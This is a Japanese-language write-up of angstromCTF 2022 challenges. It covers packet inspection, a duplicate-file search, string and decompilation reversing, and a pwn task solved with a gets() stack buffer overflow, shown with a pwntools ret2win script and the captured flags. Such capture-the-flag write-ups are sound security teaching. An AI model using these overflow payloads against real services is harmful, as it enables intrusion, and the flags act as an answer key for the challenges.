# angstorm ctf 2022

## MISC

### Shark1

Follow TCP で見つかりました
```
Hello!
Here is the flag:
actf{wireshark_doo_doo_doo_doo_doo_doo}
```

### amongus

フラグらしき名前が関われたファイルが大量に配布されました。txtファイルの内容が類似していたことから、1つだけ他のファイルと違うのだろうなと思い、中身をkeyとした辞書を作りました。末尾に改行コードが含まれていたファイル名がフラグでした。

```python
import glob

f_dict = {}
files = glob.glob("./out/*")
for file in files:
  f = open(file, "r")
  read_data = f.read()
  f_dict[file] = read_data
  f.close()

dict_no_dup = dict()
result = dict()
for key, val in f_dict.items():
    dict_no_dup[val] = key

for key, val in dict_no_dup.items():
    result[val] = key

print(result)
```
#### FLAG

```
actf{look1ng_f0r_answers_in_the_p0uring_r4in_b21f9732f829}
```

## REV

### baby3

末尾のHを除くと通りました。

```bash
$ strings chall
actf{emhH
paidmezeH
rodollarH
stomaketH
hischallH
enge_amoH
gus}
# fail
actf{emhHpaidmezeHrodollarHstomaketHhischallHenge_amoHgus}
# success
actf{emhpaidmezerodollarstomakethischallenge_amogus}
```

### Number Game

`print_flag`関数を呼ぶために、必要な入力値を計算しました。
そのため、以下のように16進数から10進数に置き換えました。

hex -> dec
- 0x12b9b0a1 -> 314159265
- 0x1e996cc9 -> 513371337
- 513371337 - 314159265 = 199212072


```c
00001249  int32_t main(int32_t argc, char** argv, char** envp)
00001249  {
00001258      puts("Welcome to clam's number game!");
00001269      printf("Step right up and guess your fir…");
00001278      fflush(stdout);
00001282      int32_t rax_2 = read_int();
00001291      int32_t rax_3;
00001291      if (rax_2 != 0x12b9b0a1)
0000128a      {
0000129a          puts("Sorry but you didn't win :(");
0000129f          rax_3 = 1;
0000129f      }
000012b5      else
000012b5      {
000012b5          printf("That's great, but can you follow…");
000012c4          fflush(stdout);
000012e3          if ((read_int() + rax_2) != 0x1e996cc9)
000012de          {
000012ec              puts("Sorry but you didn't win :(");
000012f1              rax_3 = 1;
000012f1          }
00001302          else
00001302          {
00001302              puts("That was the easy part. Now, wha…");
00001307              getchar();
0000131f              void var_58;
0000131f              fgets(&var_58, 0x40, stdin);
00001337              *(int8_t*)(&var_58 + strcspn(&var_58, &data_2064)) = 0;
00001351              if (strcmp(&var_58, "the airspeed velocity of an unla…") == 0)
0000134f              {
0000136d                  puts("How... how did you get that? Tha…");
00001379                  puts("Whatever, you can have your flag…");
00001383                  print_flag();
00001388                  rax_3 = 0;
00001388              }
0000135a              else
0000135a              {
0000135a                  puts("Ha! I knew I would get you there…");
0000135f                  rax_3 = 1;
0000135f              }
0000135f          }
0000135f      }
0000138e      return rax_3;
0000138e  }
//
00002150  char const data_2150[0x2c] = "the airspeed velocity of an unladen swallow", 0
```

```bash
$ nc challs.actf.co 31334
Welcome to clam's number game!
Step right up and guess your first number: 314159265
That's great, but can you follow it up? 199212072
That was the easy part. Now, what's the 42nd number of the Maltese alphabet?
the airspeed velocity of an unladen swallow
How... how did you get that? That reference doesn't even make sense...
Whatever, you can have your flag I guess.
actf{it_turns_out_you_dont_need_source_huh}
```

## pwn

### wah

BOFにより、gets関数経由でリターンアドレスからflag()関数へ飛ばしました。paddingで2バイト文字を40個用意しました。

```c
#include <stdio.h>
#include <stdlib.h>

void flag(){
    char flag[128];
    
    FILE *file = fopen("flag.txt","r");
    if (!file) {
        puts("Error: missing flag.txt.");
        exit(1);
    }

    fgets(flag, 128, file);
    puts(flag);
}

int main(){
    setbuf(stdout, NULL);
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    
    char cry[24];

    printf("Cry: ");

    gets(cry);
    return 0;
}
```

```
$ python3 -c 'print("A"*39)' | strace -i ./wah
[00007f455daf60a7] write(1, "Cry: ", 5Cry: ) = 5
[00007f455daf5549] fstat(0, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
[00007f455dafc2bb] brk(NULL)            = 0x488000
[00007f455dafc2bb] brk(0x4a9000)        = 0x4a9000
[00007f455daf6002] read(0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 4096) = 40
[00007f455dacb176] exit_group(0)        = ?
[????????????????] +++ exited with 0 +++
$ python3 -c 'print("A"*40)' | strace -i ./wah
[00007f86ebd410a7] write(1, "Cry: ", 5Cry: ) = 5
[00007f86ebd41002] read(0, "", 4096)    = 0
[00007f86ebe217f0] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_ACCERR, si_addr=0x7f86ebe217f0} ---
[????????????????] +++ killed by SIGSEGV +++
Segmentation fault
```

```python
from pwn import *

binfile = "./wah"
context.binary = binfile
elf = ELF(binfile)

rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]

flag = elf.symbols['flag']
HOST='challs.actf.co'
PORT=31224

# conn = process(binfile)
conn = remote(HOST, PORT)
conn.recvuntil('Cry:')
# padding + ret(8byte, allignment) + fun(=/bin/sh)

payload = b'A' * 40 + p64(ret) + p64(flag)

conn.sendline(payload)
conn.interactive()
```


```bash
$ python3 wah.py
[*] '/wah'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './wah'
[+] Opening connection to challs.actf.co on port 31224: Done
wah.py:16: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  conn.recvuntil('Cry:')
[*] Switching to interactive mode
 actf{lo0k_both_w4ys_before_y0u_cros5_my_m1nd_c9a2c82aba6e}

[*] Got EOF while reading in interactive
```

#### FLAG

```
actf{lo0k_both_w4ys_before_y0u_cros5_my_m1nd_c9a2c82aba6e}
```